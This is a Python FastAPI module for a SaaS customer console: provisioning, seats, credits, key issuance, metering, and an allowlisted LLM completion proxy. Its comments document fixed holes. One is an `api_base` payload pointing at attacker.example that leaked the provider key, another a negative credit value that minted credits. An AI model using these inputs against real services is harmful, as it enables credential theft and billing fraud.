"""The Customer Console HTTP surface.

WS-31 CP-1/CP-3 · spec ``project-docs/specs/customer_console.md`` §6.

**Three authentication schemes, and which one an endpoint takes is a design
statement** (see :mod:`customer_console.auth`):

  * ``Operator`` — a staff token, for cross-organization surfaces: provisioning,
    seat writes, credit grants, key issuance.
  * ``Internal`` — the Router's token, for writing the meter.
  * ``KeyCaller`` — the customer's own ``cc_live_…`` key. **Read-only**, and it
    reaches exactly one endpoint (``/me``). **The key resolves the
    organization**; nothing under key auth takes an organization from request
    input, because that would make the caller the authority on which customer
    they are (``user_management_contract.md`` R11).

⚠️ The customer key deliberately cannot write the meter. It briefly could, and
verification found that let a negative ``billed_credits`` mint credits — and,
more fundamentally, made the metered party the reporter of its own usage. See
:mod:`customer_console.auth` for the full note.

Both fail **closed**: the operator token has no default and an unconfigured
deployment 503s rather than admitting anyone. That is CP-0's lesson applied from
the first line rather than retrofitted — do not "temporarily" relax it, which is
precisely how the workbench came to serve every route to anyone (D33.1).

Still to come: the customer-admin surface is WS-30's, and the operator console is
CP-8 — a separate deployable app (D35), never a route tree in here.

Endpoints are ``def`` rather than ``async def`` so FastAPI runs them in its
threadpool alongside the sync engine (see :mod:`customer_console.db`). ⚠️ CP-4 first
shipped ``/v1/chat/completions`` as ``async def`` while still opening the sync
engine inside it, which blocked the event loop for two round trips on the
highest-QPS endpoint on the plane *and* contradicted this paragraph. It is
``def`` again; the provider coroutine is driven with ``asyncio.run`` inside the
threadpool worker.
"""
from __future__ import annotations

import asyncio
import json
import logging
import uuid
from decimal import Decimal
from typing import Any

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy import text

from customer_console import store
from customer_console.auth import Internal, KeyCaller, Operator
from customer_console.credits import (
    OverdraftPolicy,
    balance_of,
    decide_spend,
)
from customer_console.db import get_engine
from customer_console.keys import mint_key
from customer_console.lifecycle import (
    TransitionRefused,
    assert_transition,
    capabilities_of,
)
from customer_console.router import (
    TierUnknown,
    call_provider,
    provider_credential,
    resolve_tier,
    usage_from_response,
)
from customer_console.seats import CORE_PLAN_SLUG, decide_assignment, seat_counts

_log = logging.getLogger("platform.router")

app = FastAPI(
    title="Metorite Customer Console",
    description=(
        "Organizations, seats, subscriptions and AI metering. Cross-tenant by "
        "design (saas_multitenancy.md §0.9.2) — never exposed to a tenant."
    ),
    version="0.1.0",
)


# ── Schemas ─────────────────────────────────────────────────────────────────

class ProvisionRequest(BaseModel):
    slug: str
    name: str
    #: Captured at SIGNUP, not at first invoice (saas_operations_doctrine.md
    #: §3.1) — chasing a GSTIN after invoices have gone out is a customer
    #: conversation, not a migration.
    gstin: str | None = None
    billing_state: str | None = None
    owner_email: str
    core_seats: int = Field(default=1, ge=1)


class LifecycleRequest(BaseModel):
    org_slug: str
    target: str
    reason: str | None = None
    #: Days of export window when moving to `cancelled`. Named here so the
    #: window is an explicit act rather than an implicit default nobody chose.
    export_window_days: int = Field(default=30, ge=1)


class ResolveRequest(BaseModel):
    org_slug: str
    email: str
    display_name: str | None = None


class SeatWriteRequest(BaseModel):
    org_slug: str
    email: str
    plan_slug: str
    source: str = "alacarte"


class CreditGrantRequest(BaseModel):
    org_slug: str
    credits: Decimal
    reason: str = "purchase"
    ref: str | None = None


class IssueKeyRequest(BaseModel):
    org_slug: str
    label: str | None = None


class RevokeKeyRequest(BaseModel):
    org_slug: str
    prefix: str


class UsageRequest(BaseModel):
    """Written by the **Router**, which holds the internal token — never by the
    customer whose usage it describes.

    ``organization_id`` is named explicitly here and that is correct: the caller
    is trusted infrastructure serving every customer, so naming the subject is
    its job, exactly as it is for the operator surfaces. R11's prohibition is on
    letting an *untrusted* caller name its own tenant, which is what the
    organization-key version of this endpoint did and why it was withdrawn.

    ⚠️ Every quantity is floored at zero. Without ``ge=0`` a negative
    ``billed_credits`` became a *positive* ledger delta — verification minted
    100,000 credits through this endpoint on a live database. The schema carries
    the matching CHECK constraints (migration 003) so the floor survives a
    future caller that bypasses this model.
    """

    organization_id: str
    request_id: str
    billed_credits: Decimal = Field(default=Decimal(0), ge=0)
    user_email: str | None = None
    agent: str | None = None
    module_slug: str | None = None
    model: str | None = None
    tier: str | None = None
    #: D1's attribution four-tuple is (run, member, agent, instance). Without
    #: the run id a completion cannot be rolled up per agent run, which is the
    #: unit an operator actually debugs.
    run_id: str | None = None
    prompt_tokens: int = Field(default=0, ge=0)
    completion_tokens: int = Field(default=0, ge=0)
    cached_tokens: int = Field(default=0, ge=0)


#: Parameters a caller may forward to the provider. **An allowlist, not a
#: blocklist**, and the difference was a live credential-exfiltration hole.
#:
#: CP-4 shipped `extra="allow"` and excluded two fields by name. `api_base` was
#: therefore forwarded from the request body, and was only overridden when the
#: credential row happened to carry one — which the platform's own row does not.
#: Verification measured the result: a customer sending
#: `{"api_base": "https://attacker.example/v1"}` received a 200 while OUR
#: platform provider key was sent to their host. One field, total compromise of
#: the credential `004_provider_keys.sql` exists to protect.
#:
#: A blocklist is only ever as complete as the author's imagination of the
#: provider's parameter surface — and litellm's surface grows without asking us.
_FORWARDABLE = frozenset({
    "messages", "temperature", "top_p", "n", "stop", "max_tokens",
    "presence_penalty", "frequency_penalty", "logit_bias", "user",
    "response_format", "seed", "tools", "tool_choice", "parallel_tool_calls",
    "reasoning_effort", "thinking",
})

#: Ceilings on the parameters that multiply what one request costs US.
#: Verification forwarded `num_retries=50`, `timeout=9999` and
#: `max_tokens=10_000_000` untouched; combined with meter suppression that is a
#: zero-balance trial org burning our provider account with nothing to show for
#: it. "No gate" (CP-4 is unpriced) was the decision; "no ceiling" was not.
_MAX_OUTPUT_TOKENS = 32_000


class CompletionRequest(BaseModel):
    """An OpenAI-shaped chat completion, addressed to a TIER.

    ⚠️ `extra="forbid"`. Everything the caller may forward is named in
    :data:`_FORWARDABLE`; anything else is rejected rather than passed through.
    See that constant for the hole this closes.
    """

    model: str = "tier-balanced"
    messages: list[dict[str, Any]]
    #: The caller's own correlation id. Stored as `client_ref`, trusted for
    #: NOTHING — it used to be the metering idempotency key, which let a caller
    #: suppress their own meter by reusing one value forever (verification F2).
    client_ref: str | None = None
    stream: bool = False

    temperature: float | None = None
    top_p: float | None = None
    n: int | None = None
    stop: Any | None = None
    max_tokens: int | None = Field(default=None, ge=1)
    presence_penalty: float | None = None
    frequency_penalty: float | None = None
    logit_bias: dict | None = None
    user: str | None = None
    response_format: dict | None = None
    seed: int | None = None
    tools: list | None = None
    tool_choice: Any | None = None
    parallel_tool_calls: bool | None = None
    reasoning_effort: str | None = None
    thinking: dict | None = None

    model_config = {"extra": "forbid"}


# ── Helpers ─────────────────────────────────────────────────────────────────

def _org_id(conn, slug: str) -> str:
    row = conn.execute(
        text("SELECT id FROM organization WHERE slug = :slug"), {"slug": slug}
    ).first()
    if row is None:
        raise HTTPException(status_code=404, detail=f"no organization {slug!r}")
    return str(row[0])


def _audit(conn, org_id: str | None, action: str, detail: dict[str, Any]) -> None:
    conn.execute(
        text(
            "INSERT INTO control_audit (organization_id, actor, action, detail) "
            "VALUES (:org, :actor, :action, CAST(:detail AS jsonb))"
        ),
        {"org": org_id, "actor": "operator", "action": action,
         "detail": json.dumps(detail)},
    )


# ── Routes ──────────────────────────────────────────────────────────────────

@app.get("/health")
def health() -> dict[str, str]:
    """Liveness. Deliberately unauthenticated and deliberately says nothing."""
    return {"status": "ok"}


@app.post("/orgs/provision")
def provision(req: ProvisionRequest, _: Operator) -> dict[str, Any]:
    """Create an organization, its owner and its Core seats. Idempotent.

    Idempotent on the org slug rather than on a request id, because the natural
    key is what a retrying signup form actually resends. Provisioning is a
    multi-step action that WILL fail halfway; re-running it must converge on one
    organization rather than produce a second (§2.1).
    """
    with get_engine().begin() as conn:
        org_id = store.ensure_organization(
            conn, slug=req.slug, name=req.name,
            gstin=req.gstin, billing_state=req.billing_state,
        )
        identity_id = store.ensure_identity(conn, email=req.owner_email)

        # Only grant on FIRST provision — a retry must not keep buying seats.
        grants, _assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG
        )
        if not grants:
            store.grant_seats(
                conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
                quantity=req.core_seats, reason="provision",
            )

        conn.execute(
            text(
                """
                INSERT INTO org_membership
                    (organization_id, user_identity_id, role, status, joined_at)
                VALUES (:org, :identity, 'owner', 'active', now())
                ON CONFLICT (organization_id, user_identity_id) DO NOTHING
                """
            ),
            {"org": org_id, "identity": identity_id},
        )
        store.try_assign_seat(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
            identity_id=identity_id, source="core",
        )
        # The trial subscription. Without this row an org has seats and no
        # commercial state at all, and every billing surface has to invent a
        # default — which is how two surfaces come to disagree about whether a
        # customer is in trial.
        conn.execute(
            text(
                """
                INSERT INTO org_subscription (organization_id, status,
                                              trial_ends_at)
                VALUES (:org, 'trial', now() + interval '14 days')
                ON CONFLICT (organization_id) DO NOTHING
                """
            ),
            {"org": org_id},
        )

        # Resumability, recorded rather than assumed. Provisioning is a
        # multi-step distributed action that WILL fail halfway; this row is what
        # lets a re-run tell "already done" from "never started" instead of
        # guessing from whichever side effect it happens to find first.
        conn.execute(
            text(
                """
                INSERT INTO provisioning_run
                    (idempotency_key, organization_id, steps_done, status)
                VALUES (:key, :org,
                        ARRAY['org','identity','seats','membership','subscription'],
                        'complete')
                ON CONFLICT (idempotency_key) DO UPDATE
                    SET organization_id = EXCLUDED.organization_id,
                        steps_done = EXCLUDED.steps_done,
                        status = 'complete',
                        updated_at = now()
                """
            ),
            {"key": f"provision:{req.slug}", "org": org_id},
        )
        _audit(conn, org_id, "org.provision", {"slug": req.slug})

    return {"organization_id": org_id, "slug": req.slug}


@app.post("/orgs/lifecycle")
def set_lifecycle(req: LifecycleRequest, _: Operator) -> dict[str, Any]:
    """Move an organization through the lifecycle. Transitions only, never sets.

    A free-form status write would let an operator move a customer straight from
    `past_due` to `deleted`, destroying their data without the export window
    §2.1 requires. The graph in :mod:`customer_console.lifecycle` makes that
    unreachable rather than merely discouraged.
    """
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        current = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()

        try:
            assert_transition(current, req.target)
        except TransitionRefused as exc:
            raise HTTPException(status_code=409, detail=str(exc))

        # Entering `cancelled` opens the export window. Recorded as a date on
        # the row, so "how long do they have" is answerable by anyone rather
        # than living in whoever ran the cancellation's memory.
        export_until = (
            f"now() + interval '{int(req.export_window_days)} days'"
            if req.target == "cancelled" else "NULL"
        )
        conn.execute(
            text(
                f"UPDATE organization SET status = :s, updated_at = now(), "
                f"       export_until = {export_until} "
                f"WHERE id = :i"
            ),
            {"s": req.target, "i": org_id},
        )
        conn.execute(
            text("UPDATE org_subscription SET status = :s, updated_at = now() "
                 "WHERE organization_id = :i AND :s <> 'deleted'"),
            {"s": req.target, "i": org_id},
        )
        _audit(conn, org_id, "org.lifecycle",
               {"from": current, "to": req.target, "reason": req.reason})

        caps = capabilities_of(req.target)

    return {
        "slug": req.org_slug, "from": current, "to": req.target,
        "can_sign_in": caps.can_sign_in, "can_use_ai": caps.can_use_ai,
        "can_write_seats": caps.can_write_seats,
        "data_retained": caps.data_retained,
    }


@app.post("/registry/resolve")
def resolve(req: ResolveRequest, _: Operator) -> dict[str, Any]:
    """Resolve a person against the registry at sign-in, consuming a Core seat.

    **This is what makes the seat cap real.** A person cannot become a user of
    an organization without the Customer Console allocating them a seat, because
    the deployment asks before admitting them (D32.4/D32.5).

    Returns 409 with a buy-more payload when the organization is full — never an
    auto-upgrade, and never a silent admit.
    """
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        caps = capabilities_of(state)
        if not caps.can_sign_in:
            # Only `deleted` lands here. `suspended` and `cancelled` sign in
            # deliberately: a customer who cannot log in cannot pay you, cannot
            # update a card and cannot export.
            raise HTTPException(
                status_code=403, detail=f"organization is {state}")

        identity_id = store.ensure_identity(
            conn, email=req.email, display_name=req.display_name
        )

        held = store.has_live_seat(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG, identity_id=identity_id
        )
        grants, assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG
        )
        decision = decide_assignment(
            seat_counts(CORE_PLAN_SLUG, grants, assigned),
            already_assigned=held,
            price_inr=store.plan_price(conn, plan_slug=CORE_PLAN_SLUG),
        )
        if not decision.allowed:
            raise HTTPException(
                status_code=decision.status,
                detail={"reason": decision.reason, "buy_more": decision.buy_more},
            )

        if not held:
            store.try_assign_seat(
                conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
                identity_id=identity_id, source="core",
            )

        role = conn.execute(
            text(
                "SELECT role, status FROM org_membership "
                "WHERE organization_id = :org AND user_identity_id = :i"
            ),
            {"org": org_id, "i": identity_id},
        ).first()
        seats = [
            r[0] for r in conn.execute(
                text(
                    "SELECT plan_slug FROM seat_assignment "
                    "WHERE organization_id = :org AND user_identity_id = :i "
                    "AND released_at IS NULL"
                ),
                {"org": org_id, "i": identity_id},
            )
        ]

    return {
        "identity_id": identity_id,
        "organization_id": org_id,
        "role": role[0] if role else "member",
        "status": role[1] if role else "active",
        "seats": seats,
    }


@app.get("/billing/summary")
def billing_summary(org_slug: str, _: Operator) -> dict[str, Any]:
    """Seats and credits for one organization — the console's single read."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        plans = [
            r[0] for r in conn.execute(
                text("SELECT slug FROM plan_catalog WHERE active ORDER BY sort_order")
            )
        ]
        seats = []
        for plan in plans:
            grants, assigned = store.seat_rows(conn, org_id=org_id, plan_slug=plan)
            if not grants and not assigned:
                continue  # never bought, never assigned — not worth a row
            c = seat_counts(plan, grants, assigned)
            seats.append({
                "plan_slug": plan,
                "purchased": c.purchased,
                "assigned": c.assigned,
                "available": c.available,
                "oversubscribed": c.oversubscribed,
            })
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

    return {
        "organization_id": org_id,
        "seats": seats,
        "credit_balance": str(balance),
    }


@app.post("/billing/seats")
def assign_seat(req: SeatWriteRequest, _: Operator) -> dict[str, Any]:
    """Assign a seat on a plan. 409 at the cap, with a buy-more payload."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        if not capabilities_of(state).can_write_seats:
            raise HTTPException(
                status_code=403,
                detail=f"organization is {state}; seats are locked")

        identity_id = store.ensure_identity(conn, email=req.email)
        held = store.has_live_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=identity_id
        )
        grants, assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=req.plan_slug
        )
        decision = decide_assignment(
            seat_counts(req.plan_slug, grants, assigned),
            already_assigned=held,
            price_inr=store.plan_price(conn, plan_slug=req.plan_slug),
        )
        if not decision.allowed:
            raise HTTPException(
                status_code=decision.status,
                detail={"reason": decision.reason, "buy_more": decision.buy_more},
            )
        store.try_assign_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug,
            identity_id=identity_id, source=req.source,
        )
        _audit(conn, org_id, "seat.assign",
               {"email": req.email, "plan": req.plan_slug})

    return {"assigned": True, "plan_slug": req.plan_slug}


@app.post("/billing/seats/release")
def release_seat(req: SeatWriteRequest, _: Operator) -> dict[str, Any]:
    """Release a seat. Frees capacity immediately (D19.3)."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        identity_id = store.ensure_identity(conn, email=req.email)
        released = store.release_seat(
            conn, org_id=org_id, plan_slug=req.plan_slug, identity_id=identity_id
        )
        _audit(conn, org_id, "seat.release",
               {"email": req.email, "plan": req.plan_slug, "released": released})

    return {"released": released}


@app.post("/credits/grant")
def grant_credits(req: CreditGrantRequest, _: Operator) -> dict[str, Any]:
    """Add credits. Append-only — a correction is another row, never an edit."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        store.add_credit(
            conn, org_id=org_id, delta=req.credits,
            reason=req.reason, ref=req.ref,
        )
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        _audit(conn, org_id, "credits.grant",
               {"delta": str(req.credits), "reason": req.reason})

    return {"balance": str(balance)}


@app.get("/credits/balance")
def credit_balance(org_slug: str, _: Operator) -> dict[str, Any]:
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        status = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()

    decision = decide_spend(
        balance, Decimal(0),
        policy=OverdraftPolicy(),
        is_trial=(status == "trial"),
    )
    return {
        "balance": str(balance),
        "in_overdraft": decision.in_overdraft,
        "org_status": status,
    }


@app.post("/keys")
def issue_key(req: IssueKeyRequest, _: Operator) -> dict[str, Any]:
    """Mint an organization key. **The token is returned exactly once.**

    Only the hash is stored, so this response is the only moment the secret
    exists anywhere. It is not recoverable — a lost key is replaced, not looked
    up, and that is the property that makes a database disclosure survivable.
    """
    minted = mint_key()
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        store.issue_key(
            conn, org_id=org_id, prefix=minted.prefix,
            key_hash=minted.key_hash, label=req.label, created_by="operator",
        )
        # The audit row records the PREFIX, never the token.
        _audit(conn, org_id, "key.issue",
               {"prefix": minted.prefix, "label": req.label})

    return {"prefix": minted.prefix, "token": minted.token}


@app.post("/keys/revoke")
def revoke_key(req: RevokeKeyRequest, _: Operator) -> dict[str, Any]:
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        revoked = store.revoke_key(conn, org_id=org_id, prefix=req.prefix)
        _audit(conn, org_id, "key.revoke",
               {"prefix": req.prefix, "revoked": revoked})
    return {"revoked": revoked}


@app.get("/keys")
def list_keys(org_slug: str, _: Operator) -> dict[str, Any]:
    """Key metadata for one org. Never returns a hash or a token."""
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        return {"keys": store.list_keys(conn, org_id=org_id)}


@app.get("/me")
def whoami(caller: KeyCaller) -> dict[str, Any]:
    """Who this key belongs to, and what it has left. **Read-only.**

    This is the whole of the organization key's surface on the Customer Console.
    It resolves the tenant from the credential (CP-3's actual point) and reports
    the balance the caller needs to render an out-of-credits state — without
    handing the metered party any way to move its own ledger.
    """
    org_id = caller.organization_id
    with get_engine().begin() as conn:
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        status = conn.execute(
            text("SELECT slug, status FROM organization WHERE id = :i"),
            {"i": org_id},
        ).first()

    return {
        "organization_id": org_id,
        "slug": status[0],
        "status": status[1],
        "credit_balance": str(balance),
        "key_prefix": caller.key_prefix,
    }


@app.post("/v1/chat/completions")
def chat_completions(req: CompletionRequest, caller: KeyCaller) -> Any:
    """Proxy one completion, and count it. **Unpriced in this slice (CP-4).**

    The organization comes from the API key, the model comes from the tier
    binding, and the usage row is written here — on our infrastructure, from
    numbers we observed — rather than reported by the party being metered.

    Declared ``def``, not ``async def``: the engine is synchronous, so an async
    route would block the event loop for two round trips on what is by design
    the highest-QPS endpoint on the plane. CP-4 shipped it async and contradicted
    both this module's and ``db.py``'s own docstrings; the provider call is
    driven through ``asyncio.run`` inside the threadpool worker instead.
    """
    org_id = caller.organization_id

    if req.stream:
        # 501, not a 500. CP-4 forwarded `stream` and returned litellm's
        # CustomStreamWrapper to FastAPI, which failed to serialise it — the
        # client got "Internal Server Error" AND a phantom zero-token usage row
        # was committed for a completion nobody received. Refusing explicitly is
        # honest; the streaming path is CP-4b and is the half that matters most,
        # since every agent runtime streams through this choke point.
        raise HTTPException(
            status_code=501,
            detail="streaming is not implemented on the Router yet (CP-4b)",
        )

    with get_engine().begin() as conn:
        try:
            resolved = resolve_tier(conn, req.model)
        except TierUnknown:
            # 400, not a silent coercion to a default. A misconfigured agent
            # must be visible rather than quietly billed (D32.7).
            raise HTTPException(
                status_code=400,
                detail=f"unknown tier {req.model!r}; name a tier, not a model",
            )
        provider = resolved.model.split("/", 1)[0]
        try:
            credential = provider_credential(conn, provider=provider, org_id=org_id)
        except Exception:
            # A missing or rotated encryption key must fail CLOSED with the same
            # 503 shape the other secrets use — not a 500 that reads as a bug.
            _log.exception("router.credential_unavailable")
            raise HTTPException(
                status_code=503, detail="provider credentials unavailable")

    if credential is None:
        raise HTTPException(
            status_code=503,
            detail=f"no provider credential configured for {provider!r}",
        )
    secret, api_base = credential

    # ALLOWLIST. Only named parameters reach the provider, and the ones that
    # multiply our cost are clamped. `api_base` is ours alone — a caller can
    # neither set it nor see it.
    passthrough = {
        k: v for k, v in req.model_dump(exclude_none=True).items()
        if k in _FORWARDABLE
    }
    requested_max = passthrough.get("max_tokens")
    passthrough["max_tokens"] = min(
        int(requested_max) if requested_max else _MAX_OUTPUT_TOKENS,
        _MAX_OUTPUT_TOKENS,
    )
    call_kwargs: dict[str, Any] = {
        **passthrough,
        "model": resolved.model,
        "api_key": secret,
        # Bounded explicitly rather than left to litellm's defaults, so one
        # request cannot become fifty provider calls.
        "num_retries": 1,
        "timeout": 120,
    }
    if api_base:
        call_kwargs["api_base"] = api_base

    try:
        response = asyncio.run(call_provider(**call_kwargs))
    except HTTPException:
        raise
    except Exception as exc:
        # Map upstream failures to something a caller can branch on. Without
        # this a provider 429 is indistinguishable from a Router bug and every
        # client treats both as fatal (or both as retryable). The message is
        # deliberately NOT echoed: it can carry the request, and the request can
        # carry customer content.
        status = getattr(exc, "status_code", None)
        _log.warning("router.provider_error", extra={"upstream_status": status})
        if isinstance(status, int) and 400 <= status < 600:
            raise HTTPException(
                status_code=502 if status >= 500 else status,
                detail="upstream provider error",
            )
        raise HTTPException(status_code=502, detail="upstream provider error")

    # Metering is best-effort and NEVER fails the call: an unmetered completion
    # is a revenue problem, a failed completion is a product problem, and the
    # product problem is worse. It runs only AFTER a successful provider call,
    # so a failed request can no longer leave a phantom row behind.
    try:
        usage = usage_from_response(response)
        with get_engine().begin() as conn:
            store.record_usage(
                conn, org_id=org_id,
                # SERVER-generated. The caller's id is correlation only — see
                # migration 005 and CompletionRequest.client_ref.
                request_id=f"rtr-{uuid.uuid4().hex}",
                client_ref=req.client_ref,
                billed_credits=Decimal(0),          # CP-4 is unpriced, on purpose
                user_email=caller.member, agent=caller.agent,
                module_slug=caller.module_slug, run_id=caller.run_id,
                model=resolved.model, tier=resolved.tier,
                prompt_tokens=usage.prompt_tokens,
                completion_tokens=usage.completion_tokens,
                cached_tokens=usage.cached_tokens,
            )
    except Exception:
        _log.exception("router.metering_failed")

    return response


@app.get("/me/billing")
def my_billing(caller: KeyCaller) -> dict[str, Any]:
    """The calling organization's OWN billing summary. Read-only.

    Exists because the customer's billing page needs this data and the
    workbench must **not** hold the operator token — a tenant deployment
    holding a cross-organization credential is the whole thing D32/D35 are
    arranged to avoid. So the deployment presents its own key, and the key
    resolves the organization (CP-3). It can read its own billing and nothing
    else, by construction rather than by a `WHERE` clause somebody has to
    remember.

    Balance is `SUM(credit_ledger)` computed here, once. The browser renders it
    and never recomputes it.
    """
    org_id = caller.organization_id
    with get_engine().begin() as conn:
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

        # Burn over a NAMED window, so the UI can say what it is measuring.
        # A figure whose window is unstated reads as authoritative and is not.
        window_days = 30
        burn = conn.execute(
            text(
                "SELECT COALESCE(SUM(billed_credits), 0) FROM usage_event "
                "WHERE organization_id = :o "
                "  AND created_at >= now() - make_interval(days => :d)"
            ),
            {"o": org_id, "d": window_days},
        ).scalar_one()

        # BYOK: metered, never charged for tokens (§3.4). Presence of the org's
        # own provider credential is what makes it true — not a flag somebody
        # sets separately and forgets to clear.
        is_byok = bool(conn.execute(
            text("SELECT 1 FROM provider_credential "
                 "WHERE organization_id = :o AND revoked_at IS NULL LIMIT 1"),
            {"o": org_id},
        ).first())

    return {
        "credits": {
            "balanceCredits": float(balance),
            "burnThisCycle": float(burn),
            "windowDays": window_days,
            "isByok": is_byok,
        },
        # SC-5 issues real documents; until an invoice exists there is nothing
        # to list, and an empty list is the honest answer rather than a stub.
        "invoices": [],
        # Self-serve checkout is SC-4a and deliberately sequenced after
        # metering (D37.1). The page renders a contact prompt, not a dead
        # button, while this is false.
        "purchaseEnabled": False,
    }


@app.post("/usage/record")
def record_usage(req: UsageRequest, _: Internal) -> dict[str, Any]:
    """Record one metered call. Idempotent on ``(organization_id, request_id)``.

    **Internal token only.** This endpoint briefly accepted the customer's own
    organization key, which was wrong twice over: it let a negative
    ``billed_credits`` mint credits, and more fundamentally it made the metered
    party the reporter of its own usage — the thing §4.1 says is "not a meter,
    it is a suggestion". The Router counts the tokens it proxied and writes this
    row; the customer's key is read-only (:func:`whoami`).

    Idempotency is scoped **per organization** (migration 003). Globally-unique
    request ids let one tenant's id silently suppress another's charge and
    turned ``recorded:false`` into a cross-tenant existence oracle.

    Returns ``recorded: false`` for a replay. Callers should treat that as
    success, not as an error to retry, or a reconnect storm becomes a retry
    storm.
    """
    org_id = req.organization_id
    with get_engine().begin() as conn:
        recorded = store.record_usage(
            conn,
            org_id=org_id,
            request_id=req.request_id,
            billed_credits=req.billed_credits,
            user_email=req.user_email,
            agent=req.agent,
            module_slug=req.module_slug,
            model=req.model,
            tier=req.tier,
            run_id=req.run_id,
            prompt_tokens=req.prompt_tokens,
            completion_tokens=req.completion_tokens,
            cached_tokens=req.cached_tokens,
        )
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

    return {"recorded": recorded, "balance": str(balance)}
